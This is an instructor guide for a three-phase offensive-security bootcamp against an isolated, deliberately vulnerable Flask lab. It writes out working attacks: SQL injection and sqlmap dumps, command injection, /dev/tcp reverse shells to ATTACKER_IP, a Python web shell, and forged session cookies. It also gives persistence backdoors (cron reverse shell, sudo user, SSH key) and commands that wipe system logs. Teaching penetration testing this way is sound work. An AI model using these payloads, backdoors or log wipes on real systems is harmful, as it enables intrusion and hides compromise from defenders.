# BootCamp-Lab - Instructor Guide

## Table of Contents
- [Overview](#overview)
- [Pre-Bootcamp Setup](#pre-bootcamp-setup)
- [Teaching Methodology](#teaching-methodology)
- [Session Plans](#session-plans)
- [Assessment & Grading](#assessment--grading)
- [Common Student Questions](#common-student-questions)
- [Troubleshooting](#troubleshooting)

---

## Overview

BootCamp-Lab is designed to support your **3-phase Offensive Security Bootcamp**:
1. **Reconnaissance & Attack Surface Mapping**
2. **Web Invasion & Application Compromise**
3. **Infrastructure Control & Post-Exploitation**

### Learning Objectives

By the end of the bootcamp, students should be able to:
- Conduct comprehensive web application reconnaissance
- Identify and exploit SQL injection vulnerabilities
- Execute command injection attacks
- Upload malicious files and achieve RCE
- Perform privilege escalation via session manipulation
- Establish persistence on compromised systems
- Write professional penetration testing reports

---

## Pre-Bootcamp Setup

### 1. Server Preparation (Recommended: Ubuntu Server 22.04)

**Option A: Direct Installation**
```bash
# Clone repository
cd /opt
git clone <your-repo> BootCamp-Lab
cd BootCamp-Lab

# Run deployment script
sudo ./deploy.sh
```

**Option B: Docker Deployment**
```bash
cd /opt/BootCamp-Lab
docker-compose up -d
```

### 2. Network Configuration

**Recommended Lab Network Topology:**
```
Internet
   |
Firewall (Block all external access)
   |
   +-- Lab Network (192.168.100.0/24)
        |
        +-- BootCamp-Lab Server (192.168.100.10)
        +-- Student Machine 1 (192.168.100.101)
        +-- Student Machine 2 (192.168.100.102)
        +-- ...
        +-- Instructor Machine (192.168.100.1)
```

**Security Measures:**
- Ensure the lab network is completely isolated from the internet
- Block outbound connections to prevent accidental exposure
- Use VLANs if multiple bootcamp groups run simultaneously
- Monitor network traffic during exercises

### 3. Student Environment Setup

**Required Tools on Student Machines:**
- Kali Linux (recommended) or similar pentesting OS
- Burp Suite or OWASP ZAP
- sqlmap
- netcat
- python3 with requests library
- flask-unsign (`pip install flask-unsign`)
- curl, wget

**Optional but Recommended:**
- Metasploit Framework
- Gobuster or dirbuster
- Nikto
- Wireshark

### 4. Testing Before Bootcamp

```bash
# Verify application is running
curl http://192.168.100.10:5000

# Test SQL injection endpoint
curl "http://192.168.100.10:5000/search?q=test"

# Check debug page
curl http://192.168.100.10:5000/debug | grep SECRET_KEY

# Verify all services
systemctl status BootCamp-Lab
```

---

##  Teaching Methodology

### Phase-by-Phase Approach

#### Phase 0: Ethics & Regulations (Day 1 - Morning)
**Duration:** 2 hours

**Topics to Cover:**
- Legal frameworks (Computer Fraud and Abuse Act, local laws)
- Ethical hacking principles
- Authorization and scope
- Rules of engagement
- Responsible disclosure

**Practical Exercise:**
- Students sign lab agreement
- Discuss real-world case studies
- Review bootcamp rules

---

#### Phase 1: Reconnaissance & Attack Surface Mapping (Day 1 - Afternoon + Day 2)
**Duration:** 6-8 hours

**Learning Objectives:**
- Understand the importance of reconnaissance
- Learn passive and active enumeration techniques
- Map attack surface systematically
- Document findings professionally

**Teaching Plan:**

**Session 1.1: Introduction to Recon (2 hours)**
```
1. Explain reconnaissance mindset
2. Demo: Browse BootCamp-Lab as a normal user
3. Show how to identify interesting endpoints
4. Students: Create initial target profile
```

**Hands-on Exercise:**
```bash
# Students should discover:
1. Technology stack (Flask, Python, SQLite)
2. Available endpoints (/login, /search, /upload, etc.)
3. Verbose error messages
4. Debug pages (/debug, /about)
5. Default credentials
6. Information disclosure vulnerabilities
```

**Expected Deliverable:**
- Reconnaissance report documenting:
  - Application structure
  - Technology stack
  - Potential entry points
  - Preliminary vulnerability assessment

**Session 1.2: Service Enumeration (2 hours)**
```
1. Port scanning (nmap)
2. Web application fingerprinting
3. Directory enumeration
4. Header analysis
5. Error message analysis
```

**Demo Script:**
```bash
# Port scanning
nmap -sV -sC 192.168.100.10

# Directory enumeration
gobuster dir -u http://192.168.100.10:5000 -w /usr/share/wordlists/dirb/common.txt

# Header analysis
curl -I http://192.168.100.10:5000

# Spider the site
# Use Burp Suite to map all endpoints
```

**Session 1.3: Information Gathering (2 hours)**
```
1. Passive reconnaissance techniques
2. Analyzing debug pages
3. Google dorking concepts
4. OSINT fundamentals
5. Creating attack plan
```

**Key Teaching Points:**
- Emphasize **systematic approach** over random testing
- Teach students to **document everything**
- Show how seemingly minor information (like SECRET_KEY) can be critical later
- Explain **attack surface** concept

**Red Flags Students Should Find:**
- ✓ `/debug` exposes SECRET_KEY
- ✓ `/about` shows system information
- ✓ Error messages reveal SQL queries
- ✓ Default credentials documented on login page
- ✓ No rate limiting on login attempts
- ✓ Session cookies look suspicious (Flask session format)

**Assessment:**
- Reconnaissance report (written document)
- Presentation of attack surface map
- Peer review of findings

---

#### Phase 2: Web Invasion & Application Compromise (Day 3-4)
**Duration:** 12-16 hours

**Learning Objectives:**
- Understand and exploit SQL injection
- Master command injection techniques
- Exploit file upload vulnerabilities
- Achieve remote code execution
- Gain initial shell access

**Session 2.1: SQL Injection Basics (3 hours)**

**Theory (45 min):**
- How SQL injection works
- Types: Error-based, Union-based, Blind
- Impact and real-world examples

**Demo (45 min):**
```sql
-- Show in browser with BootCamp-Lab

1. Error-based detection:
   Username: test'
   Password: anything
   [Show error message]

2. Authentication bypass:
   Username: admin' OR '1'='1' --
   Password: anything
   [Successfully logged in]

3. UNION injection in search:
   Search: ' UNION SELECT 1,2,3,4,5--
   [Show column count]
   
   Search: ' UNION SELECT id,username,password,email,role FROM users--
   [Extract user data]
```

**Hands-on (90 min):**
Students must:
1. Bypass login using SQL injection
2. Extract all user credentials from search
3. Find admin password
4. Document the vulnerability

**Teaching Tips:**
- Start with simple `'` to break the query
- Show the vulnerable code in `app.py` after students find the vuln
- Explain why parameterized queries prevent SQLi
- Demonstrate sqlmap as automated tool

**Session 2.2: Advanced SQL Injection (2 hours)**

**Objectives:**
- Database structure enumeration
- Multi-table data extraction
- Using sqlmap

**Demo with sqlmap:**
```bash
# Automated exploitation
sqlmap -u "http://192.168.100.10:5000/search?q=test" --batch --dump

# Specific table
sqlmap -u "http://192.168.100.10:5000/search?q=test" -D main -T users --dump

# Get database structure
sqlmap -u "http://192.168.100.10:5000/search?q=test" --schema
```

**Session 2.3: Command Injection (3 hours)**

**Theory (30 min):**
- OS command injection explained
- Command separators: `;`, `&&`, `||`, `|`
- Dangers of unsanitized input

**Demo (60 min):**
```bash
# In BootCamp-Lab ping utility:

1. Basic command execution:
   Host: 127.0.0.1; whoami
   [Shows current user]

2. File reading:
   Host: 127.0.0.1; cat /etc/passwd
   [Shows passwd file]

3. Reverse shell:
   # On attacker machine:
   nc -lvnp 4444
   
   # In ping utility:
   Host: 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
   [Receive shell]
```

**Hands-on (90 min):**
Students must:
1. Execute arbitrary commands via ping
2. Read sensitive files
3. Establish reverse shell
4. Maintain access

**Common Student Challenges:**
- Reverse shell syntax errors
- Firewall blocking connections
- Special character encoding
- Network connectivity issues

**Solutions:**
- Provide working reverse shell templates
- Ensure network allows connections
- Test with simple commands first
- Use URL encoding if needed

**Session 2.4: File Upload to RCE (3 hours)**

**Theory (30 min):**
- File upload vulnerabilities
- MIME type bypasses
- Web shells explained
- Path traversal

**Demo (60 min):**

1. **Python Web Shell:**
```python
# shell.py
import os
from flask import request
cmd = request.args.get('cmd', 'id')
print(os.popen(cmd).read())
```

Upload to `/upload` then access:
```
http://192.168.100.10:5000/uploads/shell.py?cmd=whoami
```

2. **Bash Reverse Shell:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Upload then execute via command injection:
```bash
Ping: 127.0.0.1; chmod +x uploads/rev.sh
Ping: 127.0.0.1; ./uploads/rev.sh
```

**Hands-on (90 min):**
Students must:
1. Upload a web shell
2. Achieve code execution
3. Escalate to reverse shell
4. Maintain persistent access

**Session 2.5: Authentication Bypass (2 hours)**

**Theory:**
- Session management vulnerabilities
- Cookie manipulation
- Weak secret keys

**Demo:**
```bash
# Get SECRET_KEY from /debug
curl http://192.168.100.10:5000/debug | grep SECRET_KEY

# Decode session cookie
flask-unsign --decode --cookie "YOUR_COOKIE"

# Forge admin session
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin', 'role': 'admin'}" --secret "weak_secret_key_12345"

# Use forged cookie to access /admin
```

**Hands-on:**
Students forge session cookie and access admin panel

**Phase 2 Deliverable:**
- Demonstrate shell access on Ubuntu Server
- Document exploitation chain
- Prepare for privilege escalation

---

#### Phase 3: Infrastructure Control & Post-Exploitation (Day 5-6)
**Duration:** 12-16 hours

**Learning Objectives:**
- Perform local enumeration
- Understand privilege escalation
- Establish persistence
- Cover tracks
- Write professional reports

**Session 3.1: Post-Exploitation Mindset (1 hour)**

**Discussion Topics:**
- Thinking like an APT
- Understanding the kill chain
- Maintaining operational security
- Documentation importance

**Session 3.2: Local Enumeration (3 hours)**

**Theory (30 min):**
- What to look for after gaining shell
- System, network, user enumeration
- Finding privilege escalation vectors

**Demo (60 min):**
```bash
# After getting shell on BootCamp-Lab server:

# System enumeration
uname -a
cat /etc/os-release
lsb_release -a

# User enumeration
whoami
id
cat /etc/passwd
last
w

# Network enumeration
ifconfig
ip addr
netstat -tulpn
ss -tulpn

# Process enumeration
ps aux
ps -ef

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l

# Find writable directories
find / -writable -type d 2>/dev/null

# Look for interesting files
find / -name "*.db" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find /home -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Environment variables
env
cat /proc/self/environ

# Check database
cd /opt/BootCamp-Lab
sqlite3 instance/vulnerable_app.db
.tables
SELECT * FROM users;
```

**Hands-on (90 min):**
Create enumeration checklist and script

**Session 3.3: Privilege Escalation (4 hours)**

**Theory (60 min):**
- Linux privilege escalation techniques
- SUID/SGID exploitation
- Kernel exploits
- Weak permissions
- Misconfigured services

**Demo:**
Since BootCamp-Lab runs as root (by design), focus on:
1. Understanding privilege context
2. How to escalate in general
3. Demonstrating with other vulnerable systems

**Alternative:** Deploy additional vulnerable VMs:
- Lin.Security
- PwnLab
- Basic Pentesting boxes

**Hands-on:**
Students practice on dedicated priv-esc boxes

**Session 3.4: Persistence Techniques (2 hours)**

**Theory (30 min):**
- Why persistence matters
- Common persistence methods
- APT techniques

**Demo (45 min):**
```bash
# SSH key persistence
mkdir -p ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Cron job backdoor
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -

# Add backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:SecurePass123!" | chpasswd
usermod -aG sudo backdoor

# Web shell persistence
cp /tmp/shell.php /var/www/html/wp-content/uploads/image.php
```

**Hands-on (45 min):**
Students implement persistence mechanisms

**Session 3.5: Covering Tracks (2 hours)**

**Theory (30 min):**
- Log locations
- Forensics basics
- Anti-forensics
- Ethical considerations

**Demo (45 min):**
```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history
export HISTFILE=/dev/null

# Clear auth logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog

# Remove web logs
cat /dev/null > /var/log/nginx/access.log
cat /dev/null > /var/log/apache2/access.log

# Clear lastlog
echo > /var/log/wtmp
echo > /var/log/btmp

# Remove uploaded files
rm /opt/BootCamp-Lab/uploads/*

# Clean database logs
sqlite3 /opt/BootCamp-Lab/instance/vulnerable_app.db "DELETE FROM activity_logs;"
```

**Ethical Discussion:**
- In real pentesting: **NEVER delete logs**
- Document what you would do, but don't do it
- Logs are evidence of compromise
- Client needs them for remediation

**Hands-on (45 min):**
Students document cleaning procedures (but don't execute)

**Session 3.6: Attack Narrative & Reporting (3 hours)**

**Theory (60 min):**
- Professional report structure
- Executive vs technical writing
- CVSS scoring
- Remediation recommendations

**Report Structure:**
```
1. Executive Summary
   - High-level findings
   - Business impact
   - Risk summary

2. Methodology
   - Scope
   - Tools used
   - Timeline

3. Findings
   For each vulnerability:
   - Title & Severity
   - Description
   - Impact
   - Proof of Concept
   - Remediation

4. Attack Narrative
   - Complete exploitation chain
   - How vulnerabilities were chained
   - Timeline of activities

5. Recommendations
   - Prioritized fixes
   - Long-term security posture

6. Appendices
   - Full tool output
   - Screenshots
   - Code samples
```

**Demo (60 min):**
Show example report for BootCamp-Lab

**Hands-on (60 min):**
Students begin writing their reports

**Phase 3 Deliverable:**
- Complete penetration testing report
- Presentation to class
- Peer review

---

## Assessment & Grading

### Suggested Grading Rubric

**Phase 1: Reconnaissance Report (20 points)**
- Completeness of enumeration: 8 pts
- Documentation quality: 6 pts
- Attack surface map: 6 pts

**Phase 2: Exploitation (40 points)**
- SQL Injection: 10 pts
- Command Injection: 10 pts
- File Upload RCE: 10 pts
- Shell access achieved: 10 pts

**Phase 3: Post-Exploitation & Reporting (40 points)**
- Local enumeration: 8 pts
- Privilege escalation understanding: 8 pts
- Persistence mechanisms: 8 pts
- Professional report: 16 pts

**Total: 100 points**

### Bonus Challenges (+20 points)

1. **Session Forgery (5 pts):** Forge admin session cookie
2. **Automated Exploitation (5 pts):** Write Python script to automate full chain
3. **Custom Payload (5 pts):** Create unique web shell
4. **Advanced Persistence (5 pts):** Implement APT-style persistence

### Practical Exam

**Final Challenge: Complete Compromise in 4 Hours**

Students must:
1. Enumerate target (30 min)
2. Gain initial access (1 hour)
3. Escalate privileges (1 hour)
4. Establish persistence (30 min)
5. Document findings (1 hour)

Graded on:
- Speed
- Stealth (how much logs they create)
- Completeness
- Report quality

---

## Common Student Questions

### Q: "The SQL injection isn't working!"
**A:** Common issues:
- Forgot the `--` comment at the end
- Using wrong quotes (single vs double)
- Not URL encoding special characters
- Try: `admin' OR '1'='1' --` with space after `--`

### Q: "Reverse shell immediately dies!"
**A:** Check:
- Firewall blocking the port
- Wrong IP address (use `ip addr` on attacker machine)
- Not listening with `nc -lvnp 4444` first
- Try alternative shells (Python, netcat varieties)

### Q: "Can't upload PHP shell!"
**A:** 
- Python is installed, not PHP by default
- Use Python web shell instead
- Or upload bash script

### Q: "Session manipulation not working!"
**A:**
- Wrong SECRET_KEY (get from `/debug`)
- Cookie not properly base64 encoded
- Browser caching old cookie (clear cookies)

### Q: "Can't find privilege escalation vector!"
**A:**
- BootCamp-Lab runs as root by design
- This simulates already compromised service
- Focus on understanding techniques
- Use additional VMs for practice

---

## Troubleshooting

### Application Won't Start

```bash
# Check service status
systemctl status BootCamp-Lab

# View logs
journalctl -u BootCamp-Lab -n 50

# Check Python errors
cd /opt/BootCamp-Lab
source venv/bin/activate
python3 app.py
```

### Database Issues

```bash
# Reset database
cd /opt/BootCamp-Lab
rm instance/vulnerable_app.db
python3 -c "from app import init_db; init_db()"
```

### Port Already in Use

```bash
# Find process using port 5000
sudo lsof -i :5000
sudo netstat -tulpn | grep 5000

# Kill process
sudo kill -9 PID
```

### Students Can't Connect

```bash
# Check firewall
sudo ufw status
sudo ufw allow 5000/tcp

# Check if service is listening
netstat -tulpn | grep 5000

# Test locally
curl http://localhost:5000

# Test from student machine
curl http://BootCamp-Lab_IP:5000
```

### Reset Lab Between Sessions

```bash
sudo /opt/BootCamp-Lab/reset_lab.sh
```

---

## Lab Management Tips

### Before Each Session:
1. Reset the database and uploads
2. Test all vulnerabilities
3. Verify network connectivity
4. Prepare backup VM

### During Session:
1. Monitor student progress
2. Watch for stuck students
3. Encourage collaboration
4. Take notes on common issues

### After Session:
1. Collect student reports
2. Review logs
3. Update documentation
4. Plan improvements

### Ongoing:
1. Keep backups of clean state
2. Document customizations
3. Share improvements with community
4. Stay updated on new techniques

---

## 🎓 Additional Resources for Teaching

### Recommended Supplementary Materials:
- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115
- "The Web Application Hacker's Handbook"
- "Real-World Bug Hunting"

### Video Resources:
- OWASP Top 10 playlist
- IppSec walkthrough style videos
- Nahamsec methodology videos
- LiveOverflow web security series

### Practice Platforms:
- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe
- PentesterLab
- DVWA

---

## Success Metrics

Track bootcamp success by:
- Student completion rate
- Average report quality score
- Time to achieve shell access
- Post-bootcamp survey results
- Job placement rates
- Student confidence levels (before/after survey)

---

## Instructor Support

For questions or issues:
1. Check documentation first
2. Review troubleshooting section
3. Contact bootcamp coordinator
4. Share improvements with team

---

**Good luck with your bootcamp! **

Remember: Your goal is to create confident, ethical security professionals who understand both the technical skills AND the responsibility that comes with them.

---

*Last updated: February 2026*
